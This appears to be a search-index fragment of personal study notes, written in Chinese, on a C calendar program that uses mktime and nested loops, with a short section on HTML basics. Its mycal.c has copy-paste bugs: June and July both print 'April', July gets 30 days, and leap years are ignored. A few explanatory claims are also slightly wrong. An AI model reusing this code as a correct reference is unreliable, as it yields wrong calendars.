2","text":"<p>\u4e3b\u8981\u65e8\u5728\u521b\u5efa\u4e00\u4e2a cal \u4e00\u6837\u7684 c \u7f16\u5199\u7684\u65e5\u5386\u7a0b\u5e8f\uff0c\u7528 double for loop \u6253\u5370 4 \u6708\u6216 8 \u6708\u7684\u65e5\u5386\uff0c\u4ece\u76f4\u63a5\u8c03\u7528\u7cfb\u7edf\u7684 cal \u5230\u81ea\u5df1\u7f16\u5199\uff0c\u719f\u6089\u4e4b\u524d\u8bfe\u7a0b\u7684\u77e5\u8bc6\u70b9\u3002</p> <p>\u8be5\u7a0b\u5e8f\u7684\u6838\u5fc3\u7b97\u6cd5\u4e00\u5171\u6709\u4e24\u4e2a\uff1a</p> <ol> <li> <p>\u4e8c\u7ef4\u77e9\u9635\u7684\u5c4f\u5e55\u663e\u793a</p> </li> <li> <p>\u5982\u4f55\u7cbe\u786e\u663e\u793a\u65e5\u671f\u5c5e\u4e8e\u661f\u671f\u51e0</p> </li> </ol> <pre><code>   December 2023\nSu Mo Tu We Th Fr Sa\n.. .. .. .. ..  1  2 \n 3  4  5  6  7  8  9 \n10 11 12 13 14 15 16 \n17 18 19 20 21 22 23 \n24 25 26 27 28 29 30 \n31 .. .. .. .. .. .. \n</code></pre> <p>\u4e8c\u7ef4\u77e9\u9635\u53ef\u4ee5\u7528\u5d4c\u5957 for loop \u89e3\u51b3\uff0c\u800c\u7b2c\u4e00\u884c\u7684\u5185\u5bb9\u53ef\u6839\u636e\u53c2\u6570\u7684\u8f93\u5165\u5355\u72ec\u5904\u7406\uff0c\u7b2c\u4e8c\u884c\u53ef\u5355\u72ec\u6253\u5370\uff0csolution \u4e2d\u5c06\u5bfb\u627e\u6307\u5b9a\u6708\u4efd\u7684\u7b2c\u4e00\u5929\u662f\u661f\u671f\u51e0\u7684\u7b97\u6cd5\u5355\u72ec\u63d0\u70bc\u6210\u4e00\u4e2a\u6587\u4ef6\u63d0\u4f9b\u7ed9\u4e3b\u7a0b\u5e8f <code>#include</code></p>"},{"location":"system/workshop_2/#first_day_of_monthc","title":"first_day_of_month.c","text":"<pre><code>#include &lt;time.h&gt;\n#include &lt;string.h&gt;\n\n//  written by ...\n\n//  PROVIDED WITHOUT MUCH EXPLANATION YET!\n\n//  RETURNS  0=Sun, 1=Mon, .....\n//\nint first_day_of_month(int month, int year)\n{\n    struct tm tm;\n\n//  SET ALL FIELDS OF tm TO ZERO TO MAKE SOME FIELDS 'UNKNOWN'\n    memset(&amp;tm, 0, sizeof(tm));\n\n//  INITIALIZE THE FILEDS THAT WE ALREADY KNOW\n    tm.tm_mday  = 1;\n    tm.tm_mon   = month-1;              // 0=Jan, 1=Feb, ....\n    tm.tm_year  = year-1900;\n\n//  ASK THE POSIX FUNCTION mktime TO DETERMINE THE 'UNKNOWN' FIELDS\n//  See: http://pubs.opengroup.org/onlinepubs/9699919799/\n    mktime(&amp;tm);\n\n//  RETURN THE INTEGER MONTH VALUE\n    return tm.tm_wday;                  // 0=Sun, 1=Mon, .....\n}\n</code></pre>"},{"location":"system/workshop_2/#analyzation","title":"Analyzation","text":""},{"location":"system/workshop_2/#mktime","title":"mktime","text":"<p>\u7b97\u6cd5\u7684\u6838\u5fc3\u5de5\u5177\u4e3a\u4e00\u4e2a\u53eb mktime \u7684\u51fd\u6570\uff1a</p> <p>mktime \u51fd\u6570\u4f7f\u7528 struct tm \u4e2d\u63d0\u4f9b\u7684\u5b57\u6bb5\u6765\u8ba1\u7b97\u65f6\u95f4\uff0c\u5e76\u5c06\u90a3\u4e9b\u6ca1\u6709\u660e\u786e\u6307\u5b9a\u7684\u5b57\u6bb5\uff08\u4f8b\u5982 tm_wday \u548c tm_yday\uff09\u8ba1\u7b97\u51fa\u6765\u3002\u5982\u679c struct tm \u4e2d\u7684\u67d0\u4e9b\u5b57\u6bb5\u672a\u521d\u59cb\u5316\u4e14\u5305\u542b\u5783\u573e\u503c\uff0cmktime \u53ef\u80fd\u4f1a\u4ea7\u751f\u9519\u8bef\u7684\u7ed3\u679c\u3002\u56e0\u6b64\uff0c\u4f7f\u7528 memset \u53ef\u4ee5\u907f\u514d\u8fd9\u4e9b\u6f5c\u5728\u7684\u95ee\u9898\u3002</p>"},{"location":"system/workshop_2/#struct","title":"struct","text":"<p>struct \u7ed3\u6784\u4f53\u5176\u5728 Python \u4e2d\u53ef\u4ee5\u88ab\u7406\u89e3\u4e3a\u4e27\u5931\u4e86 function \u529f\u80fd\u7684 class\uff0c\u5b9a\u4e49\u6570\u636e\u7ed3\u6784:</p> <pre><code>class Point:\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n\n# \u521b\u5efa\u7c7b\u7684\u5b9e\u4f8b\np1 = Point(10, 20)\nprint(p1.x, p1.y)  # \u8f93\u51fa: 10 20\n</code></pre> <p>\u5728 time.h \u4e2d c \u8bed\u8a00\u4f7f\u7528\u4e86\u7ed3\u6784\u4f53\u5b9a\u4e49\u4e86 tm \u8fd9\u79cd\u6570\u636e\u7c7b\u578b\uff1a</p> <pre><code>struct tm {\n    int tm_sec;     /* seconds after the minute [0-60] */\n    int tm_min;     /* minutes after the hour [0-59] */\n    int tm_hour;    /* hours since midnight [0-23] */\n    int tm_mday;    /* day of the month [1-31] */\n    int tm_mon;     /* months since January [0-11] */\n    int tm_year;    /* years since 1900 */\n    int tm_wday;    /* days since Sunday [0-6] */\n    int tm_yday;    /* days since January 1 [0-365] */\n    int tm_isdst;   /* Daylight Savings Time flag */\n    long    tm_gmtoff;  /* offset from UTC in seconds */\n    char    *tm_zone;   /* timezone abbreviation */\n};\n</code></pre> <p>\u56e0\u6b64 <code>struct tm tm</code> \u4e3a\u58f0\u660e\u4e00\u4e2a tm \u6570\u636e\u7ed3\u6784\u7684\u540d\u4e3a tm \u7684\u53d8\u91cf</p> <pre><code>memset(&amp;tm, 0, sizeof(tm));\n</code></pre> <p>memset \u662f\u4e00\u4e2a\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u7528\u4e8e\u5c06\u4e00\u5757\u5185\u5b58\u533a\u57df\u4e2d\u7684\u6240\u6709\u5b57\u8282\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7684\u503c\u3002memset \u5c06 tm \u7ed3\u6784\u4f53\u7684\u6240\u6709\u5b57\u6bb5\u90fd\u8bbe\u7f6e\u4e3a 0. \u4e3a\u4e86\u4fdd\u8bc1 mktime \u51fd\u6570\u7684\u5de5\u4f5c\u6b63\u5e38\u8c03\u7528\u8be5\u51fd\u6570\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u5982\u679c\u4e0d\u8c03\u7528\u624b\u52a8\u521d\u59cb\u5316\u76f8\u5bf9\u6765\u8bf4\u8f83\u4e3a\u9ebb\u70e6\uff1a</p> <pre><code>tm.tm_sec = 0;\ntm.tm_min = 0;\ntm.tm_hour = 0;\ntm.tm_mday = 1;\ntm.tm_mon = month - 1;\ntm.tm_year = year - 1900;\ntm.tm_wday = 0;  // \u8fd9\u4e9b\u5b57\u6bb5\u5b9e\u9645\u4e0a\u4f1a\u88ab mktime \u91cd\u65b0\u8ba1\u7b97\ntm.tm_yday = 0;\ntm.tm_isdst = 0;\n</code></pre> <p>\u5728 <code>time.h</code> \u6587\u4ef6\u91cc\u53ef\u4ee5\u770b\u5230\u5929\u4e3a 1 - 31 \u6b63\u5e38\u4f20\u53c2\u5b9a\u4e49\uff0c\u5468\u4e3a 0 - 11 \u8ba1\u7b97\uff0c\u5e74\u4e3a\u4ece 1900 \u5e74\u7b97\u8d77\uff0c\u56e0\u6b64\u5728\u540e\u7eed\u4f20\u53c2\u6570\u7ed9 <code>first_day_of_month(int month, int year)</code> \u540e\uff0c\u4f1a\u88ab\u81ea\u52a8\u5b9a\u4e49\u4e3a\u6307\u5b9a\u5e74\u4efd\u7684\u6307\u5b9a\u6708\u6570\u7684\u7b2c\u4e00\u5929\u3002\u7ecf\u8fc7 mktime \u51fd\u6570\u8ba1\u7b97\u8fc7\u540e\u4f1a\u8fd4\u56de\u6ca1\u6709\u5b9a\u4e49\u7684\u53d8\u91cf\uff0ctm_wday \u4f1a\u8fd4\u56de 0 - 6 \u5206\u522b\u4f9d\u6b21\u4ee3\u8868\u5468\u672b - \u5468\u516d\u3002</p>"},{"location":"system/workshop_2/#mycalc","title":"mycal.c","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#include \"first_day_of_month.c\"\n\n#define DEFAULT_MONTH           8\n#define DEFAULT_YEAR            2023\n\n#define NWEEKS                  6\n#define DAYS_PER_WEEK           7\n\nvoid print_cal(int month, int year)\n{\n    int day1        = first_day_of_month(month, year);\n    int daysinmonth = 0;\n\n    switch (month) {\n        case 1: printf(\"   January %i\\n\", year);\n                daysinmonth = 31;\n                break;\n\n        case 2: printf(\"   February %i\\n\", year);\n                daysinmonth = 28;\n                break;\n\n        case 3: printf(\"   March %i\\n\", year);\n                daysinmonth = 31;\n                break;\n\n        case 4: printf(\"   April %i\\n\", year);\n                daysinmonth = 30;\n                break;\n\n        case 5: printf(\"   May %i\\n\", year);\n            daysinmonth = 31;\n            break;\n\n        case 6: printf(\"   April %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 7: printf(\"   April %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 8: printf(\"   August %i\\n\", year);\n            daysinmonth = 31;\n            break;\n\n        case 9: printf(\"   September %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 10: printf(\"   October %i\\n\", year);\n            daysinmonth = 31;\n            break;\n\n        case 11: printf(\"   November %i\\n\", year);\n            daysinmonth = 30;\n            break;\n\n        case 12: printf(\"   December %i\\n\", year);\n            daysinmonth = 31;\n            break;\n    }\n\n    printf(\"Su Mo Tu We Th Fr Sa\\n\");\n\n    int day = 1 - day1;\n    for(int w=0 ; w&lt;NWEEKS ; ++w) {\n        for(int d=0 ; d&lt;DAYS_PER_WEEK ; ++d) {\n            if(day &lt; 1 || day &gt; daysinmonth) {\n                printf(\".. \");\n            }\n            else {\n                printf(\"%2i \", day);\n            }\n            ++day;\n        }\n        printf(\"\\n\");\n    }\n}\n\nint main(int argcount, char *argvalue[ ])\n{\n    int month   = DEFAULT_MONTH;\n    int year    = DEFAULT_YEAR;\n\n    if(argcount &gt; 1) {\n        month   = atoi(argvalue[1]);\n        if(argcount &gt; 2) {\n            year = atoi(argvalue[2]);\n        }\n    }\n\n    print_cal(month, year);\n\n    return 0;\n}\n</code></pre> <p>\u7a0b\u5e8f\u7684\u6838\u5fc3\u7247\u6bb5\u7b97\u6cd5\u4e3a\u8be5 nested for loop:</p> <pre><code>for(int w = 0; w &lt; NWEEKS; ++w) {\n    for(int d = 0; d &lt; DAYS_PER_WEEK; ++d) {\n        if(day &lt; 1 || day &gt; daysinmonth) {\n            printf(\".. \");\n        }\n        else {\n            printf(\"%2i \", day);   // format using 2 columns\n        }\n        ++day;\n    }\n    printf(\"\\n\");       // move printing to a new line after each week\n}\n</code></pre>"},{"location":"system/workshop_2/#outer-loop","title":"Outer Loop","text":"<p>w \u53d8\u91cf\uff1a\u8868\u793a\u5f53\u524d\u7684\u5468\u6570\uff0c\u4ece 0 \u5f00\u59cb\u5230 NWEEKS - 1\uff0c\u8fd9\u91cc NWEEKS \u88ab\u5b9a\u4e49\u4e3a 6\uff0c\u610f\u5473\u7740\u6700\u591a\u6253\u5370 6 \u884c\uff0c\u6bcf\u884c\u4ee3\u8868\u4e00\u5468\u3002</p> <p>\u5faa\u73af\u4f5c\u7528\uff1a\u5916\u5c42\u5faa\u73af\u8d1f\u8d23\u63a7\u5236\u884c\u6570\uff08\u5373\u5468\u6570\uff09\uff0c\u6bcf\u4e00\u8f6e\u5faa\u73af\u6253\u5370\u4e00\u5468\u7684\u65e5\u671f\u3002</p>"},{"location":"system/workshop_2/#inner-loop","title":"Inner Loop","text":"<p>d \u53d8\u91cf\uff1a\u8868\u793a\u5f53\u524d\u7684\u5929\u6570\uff08\u4ece\u5468\u65e5\u5230\u5468\u516d\uff09\uff0c\u4ece 0 \u5f00\u59cb\u5230 DAYS_PER_WEEK - 1\uff0c\u8fd9\u91cc DAYS_PER_WEEK \u88ab\u5b9a\u4e49\u4e3a 7\uff0c\u8868\u793a\u4e00\u5468\u4e03\u5929\u3002</p> <p>\u5faa\u73af\u4f5c\u7528\uff1a\u5185\u5c42\u5faa\u73af\u8d1f\u8d23\u63a7\u5236\u4e00\u5468\u4e2d\u6bcf\u5929\u7684\u8f93\u51fa\uff0c\u786e\u4fdd\u5728\u6bcf\u4e00\u884c\u4e2d\u6253\u5370\u51fa\u4ece\u5468\u65e5\u5230\u5468\u516d\u7684\u65e5\u671f\u3002</p>"},{"location":"system/workshop_2/#_1","title":"\u5224\u65ad\u903b\u8f91","text":"<pre><code>if(day &lt; 1 || day &gt; daysinmonth) {\n    printf(\".. \");\n} else {\n    printf(\"%2i \", day);   // format using 2 columns\n}\n</code></pre> <ul> <li> <p>day \u53d8\u91cf\uff1aday \u662f\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5f53\u524d\u9700\u8981\u6253\u5370\u7684\u65e5\u671f\u3002\u8fd9\u4e2a\u53d8\u91cf\u6700\u521d\u88ab\u521d\u59cb\u5316\u4e3a 1 - day1\uff0c\u5176\u4e2d day1 \u662f\u8fd9\u4e2a\u6708\u7b2c\u4e00\u5929\u7684\u661f\u671f\u6570\uff08\u4f8b\u5982\uff0c0 \u8868\u793a\u661f\u671f\u65e5\uff0c1 \u8868\u793a\u661f\u671f\u4e00\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff09\u3002</p> </li> <li> <p>if(day &lt; 1 || day &gt; daysinmonth) \u6761\u4ef6\uff1a</p> </li> <li> <p>\u5982\u679c day \u5c0f\u4e8e 1\uff08\u8868\u793a\u5f53\u524d\u7684\u65e5\u671f\u5728\u8fd9\u4e2a\u6708\u5f00\u59cb\u4e4b\u524d\uff09\u6216\u8005\u5927\u4e8e daysinmonth\uff08\u8868\u793a\u5f53\u524d\u7684\u65e5\u671f\u5df2\u7ecf\u8d85\u51fa\u4e86\u8fd9\u4e2a\u6708\u7684\u5929\u6570\uff09\uff0c\u5c31\u6253\u5370 \"..\" \u4f5c\u4e3a\u5360\u4f4d\u7b26\u3002</p> </li> <li> <p>\u8fd9\u6837\u53ef\u4ee5\u4fdd\u6301\u6bcf\u4e00\u884c\u7684\u683c\u5f0f\u4e00\u81f4\uff0c\u5c24\u5176\u662f\u5728\u7b2c\u4e00\u4e2a\u661f\u671f\u5f00\u59cb\u4e4b\u524d\u7684\u7a7a\u767d\u5904\u548c\u6700\u540e\u4e00\u4e2a\u661f\u671f\u7ed3\u675f\u540e\u7684\u7a7a\u767d\u5904\u3002</p> </li> <li> <p>else \u5206\u652f\uff1a</p> </li> <li> <p>\u5982\u679c day \u5728\u5408\u6cd5\u8303\u56f4\u5185\uff08\u5373\u5927\u4e8e\u6216\u7b49\u4e8e 1 \u4e14\u5c0f\u4e8e\u6216\u7b49\u4e8e daysinmonth\uff09\uff0c\u5219\u6253\u5370\u5f53\u524d\u65e5\u671f\u3002%2i \u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u8868\u793a\u6253\u5370\u4e00\u4e2a\u53f3\u5bf9\u9f50\u7684\u4e24\u4f4d\u6570\u65e5\u671f\u3002</p> </li> <li> <p>++day\uff1a\u6bcf\u6253\u5370\u4e00\u5929\uff0cday \u53d8\u91cf\u81ea\u589e 1\uff0c\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u65e5\u671f\u3002</p> </li> <li> <p>\u5728\u5185\u5c42\u5faa\u73af\u7ed3\u675f\u540e\uff0c\u8c03\u7528 printf(\"\\n\"); \u5c06\u6253\u5370\u79fb\u52a8\u5230\u4e0b\u4e00\u884c\uff0c\u4ece\u800c\u5f00\u59cb\u6253\u5370\u4e0b\u4e00\u5468\u7684\u65e5\u671f\u3002</p> </li> </ul>"},{"location":"system/workshop_2/#conclusion","title":"Conclusion","text":"<p>\u8be5\u7a0b\u5e8f\u6838\u5fc3\u4e3a\u8c03\u7528 mktime \u51fd\u6570\u4f20\u53c2\u6307\u5b9a\u5e74\u4efd\u548c\u6708\u6570\u4ee5\u53ca\u5f53\u6708\u7684\u7b2c\u4e00\u5929\uff0c\u83b7\u5f97\u5176\u8fd4\u56de\u7684\u5f53\u6708\u7684\u7b2c\u4e00\u5929\u5c5e\u4e8e\u7b2c\u51e0\u5468\u3002\u7136\u540e\u4f7f\u7528 nested for loop \u6253\u5370\u4e8c\u7ef4\u77e9\u9635\uff1a\u5916\u5c42\u8d1f\u8d23\u63a7\u5236\u6700\u5927\u5468\u6570\uff0c\u4e00\u4e2a\u6708\u6700\u5927\u7684\u5468\u6570\u4e0d\u4f1a\u8d85\u8fc7 6 \u884c\uff0c\u56e0\u6b64\u5728\u6253\u5370 2 \u6708\u7684\u65f6\u5019\u53ef\u4ee5\u53d1\u73b0\u6700\u540e\u4e00\u5468\u5168\u90e8\u88ab\u66ff\u6362\u6210\u4e86 ..</p> <pre><code>   February 2023\nSu Mo Tu We Th Fr Sa\n.. .. ..  1  2  3  4 \n 5  6  7  8  9 10 11 \n12 13 14 15 16 17 18 \n19 20 21 22 23 24 25 \n26 27 28 .. .. .. .. \n.. .. .. .. .. .. .. \n</code></pre> <p>\u5185\u5c42\u5faa\u73af\u4e3b\u8981\u5224\u65ad\u5f53\u6708\u7b2c\u4e00\u5929\u7684\u8d77\u59cb\u4f4d\u7f6e\uff0c\u7528 1 - day1 \u7684\u7b97\u6cd5\u786e\u5b9a\u6709\u591a\u5c11\u4e2a\u7a7a\u5929\u6570\uff0c\u4f8b\u5982\u5468\u4e94\u5c31\u662f -4, [-4, -3, -2, -1, 0] \u4e00\u76f4\u5230\u7b49\u4e8e 1 \u7684\u65f6\u5019\u5c31\u80fd\u786e\u8ba4\u8be5\u5217\u662f\u7b2c\u4e00\u5929\uff0c\u7136\u540e\u7528 <code>%2i</code> \u7684\u683c\u5f0f\u4fdd\u8bc1\u4e24\u4e2a\u5b57\u6bb5\u5bbd\u5ea6\u8f93\u51fa\u5929\u6570\uff0c\u4e3b\u8981\u4e3a\u4e86\u4fdd\u8bc1\u683c\u5f0f\u5316\u8f93\u51fa\u540e\u7684\u7f8e\u89c2\u6574\u9f50\uff0c\u7136\u540e\u9010\u6e10\u589e\u52a0 day \u7684\u5929\u6570\u76f4\u5230\u8d85\u8fc7\u5f53\u6708\u63d0\u524d\u5b9a\u4e49\u597d\u7684\u6700\u5927\u5929\u6570\u3002</p> <pre><code>   December 2023\nSu Mo Tu We Th Fr Sa\n.. .. .. .. ..  1  2 \n 3  4  5  6  7  8  9 \n10 11 12 13 14 15 16 \n17 18 19 20 21 22 23 \n24 25 26 27 28 29 30 \n31 .. .. .. .. .. .. \n</code></pre> <p>\u7a0b\u5e8f\u7528\u5230\u4e86 atoi \u7ed9 argvalue \u8f6c\u6362\u6570\u636e\u7c7b\u578b\u4e3a integer, \u7528 switch \u8bed\u53e5\u63d0\u524d\u6253\u5370\u7b2c\u4e8c\u884c\u7684\u6708\u4efd\u5e76\u624b\u52a8\u5b9a\u4e49\u6700\u5927\u5929\u6570\uff0c\u56e0\u6b64\u5728 switch \u4e2d\u6ca1\u6709\u7528\u5230 default \u8bed\u53e5\u3002\u6559\u6388\u8fd8\u7528\u5230\u4e86 <code>#define</code> \u8bed\u53e5\u63d0\u524d\u5b9a\u4e49\u4e00\u4e9b\u5e38\u91cf\uff0c\u8282\u7701\u5185\u5b58\u4e0e\u7f16\u8bd1\u5668\u65f6\u95f4\u3002</p>"},{"location":"webdev/html_syntax/","title":"HTML Basic Syntax","text":""},{"location":"webdev/html_syntax/#shortcut","title":"Shortcut","text":"<ul> <li>! \u52a0 return \u5feb\u901f\u5f97\u5230 html \u524d\u7f00</li> <li>shift + \u4e0a\u4e0b\u5de6\u53f3\u53ef\u4ee5\u9009\u62e9\u6587\u672c</li> <li>shift + option + \u4e0b\uff0c\u5411\u4e0b\u7c98\u8d34</li> </ul>"},{"location":"webdev/html_syntax/#headers","title":"Headers","text":"<pre><code>&lt;h1&gt;hello world&lt;/h1&gt;\n</code></pre> <ul> <li>\u8fd9\u6837\u7684\u6574\u4f53\u53eb element, <code>&lt;h1&gt;</code> \u548c <code>&lt;/h1&gt;</code> \u5206\u522b\u4e3a opening \u548c closing tag</li> <li>header \u53ea\u6709 <code>&lt;h1&gt;</code> -  <code>&lt;h6&gt;</code></li> </ul>"},{"location":"webdev/html_syntax/#paragraphs","title":"Paragraphs","text":"<p>Lorem Ipsum \u662f\u4e00\u79cd\u7528\u4e8e\u6392\u7248\u548c\u8bbe\u8ba1\u7684\u5047\u6587\uff0c\u901a\u5e38\u88ab\u7528\u4f5c\u5360\u4f4d\u7b26\u6587\u672c\u3002\u5176\u76ee\u7684\u662f\u5728\u8bbe\u8ba1\u6837\u672c\u4e2d\u63d0\u4f9b\u4e00\u4e2a\u6587\u672c\u586b\u5145\uff0c\u4ee5\u4fbf\u5728\u6ca1\u6709\u5b9e\u9645\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\u6a21\u62df\u6587\u672c\u7684\u5916\u89c2\u548c\u5e03\u5c40\u3002\u8fd9\u5bf9\u4e8e\u68c0\u67e5\u5b57\u4f53\u3001\u6392\u7248\u548c\u6574\u4f53\u8bbe\u8ba1\u6548\u679c\u975e\u5e38\u6709\u7528\u3002</p> <p>Lorem Ipsum \u7684\u6765\u6e90\u53ef\u4ee5\u8ffd\u6eaf\u5230\u53e4\u7f57\u9a6c\u65f6\u671f\u7684\u62c9\u4e01\u6587\u5b66\uff0c\u7279\u522b\u662f\u516c\u5143\u524d45\u5e74\u5de6\u53f3\u897f\u585e\u7f57\uff08Cicero\uff09\u7684\u8457\u4f5c\u300a\u5584\u4e0e\u6076\u7684\u7ec8\u6781\u7406\u8bba\u300b\uff08\"De finibus bonorum et malorum\"\uff09\u3002\u867d\u7136\u5b83\u662f\u62c9\u4e01\u6587\uff0c\u4f46 Lorem Ipsum \u5e76\u6ca1\u6709\u5b9e\u9645\u610f\u4e49\uff0c\u4ec5\u4ec5\u662f\u4e00\u79cd\u6a21\u62df\u6587\u672c\u7684\u5de5\u5177\u3002</p> <p>\u73b0\u4ee3\u8bbe\u8ba1\u548c\u5f00\u53d1\u5de5\u5177\u4e2d\uff0cLorem Ipsum \u7ecf\u5e38\u88ab\u7528\u6765\u586b\u5145\u6587\u672c\u6846\u3001\u6587\u7ae0\u548c\u6bb5\u843d\uff0c\u5e2e\u52a9\u8bbe\u8ba1\u5e08\u548c\u5f00\u53d1\u8005\u4e13\u6ce8\u4e8e\u5e03\u5c40\u548c\u529f\u80fd\uff0c\u800c\u4e0d\u662f\u5185\u5bb9\u3002</p> <p>www.lipsum.co \u6216\u8005\u81ea\u5df1 Google Funny Lorem Ipsum</p>"},{"location":"webdev/html_syntax/#void-element","title":"Void Element","text":"<pre><code>&lt;hr /&gt;\n&lt;br /&gt; \n</code></pre> <p>\u4ee5\u4e0a\u4e24\u79cd tag \u5206\u522b\u53eb horizontal rule \u548c break element\uff0c\u73b0\u4ee3\u7f51\u9875\u5f00\u53d1\u4e2d HTML \u81ea\u52a8\u5ffd\u7565\u7a7a\u683c\u548c / \u7b26\u53f7\uff0c\u76f4\u63a5\u4f7f\u7528 <code>&lt;hr&gt;</code> \u548c <code>&lt;br&gt;</code> \u5373\u53ef\uff0c\u4f46\u524d\u8005\u66f4\u4e3a\u6807\u51c6\u3002</p> <p>\u5728 paragraph \u4e2d\u7a7a\u884c\u6700\u597d\u4f7f\u7528\u591a\u4e2a <code>&lt;p&gt;</code> tag, \u4e2d\u95f4\u7a7f\u63d2 <code>&lt;br&gt;</code> \u4f1a\u5bfc\u81f4\u76f2\u4eba\u9605\u8bfb\u56f0\u96be</p>"}]}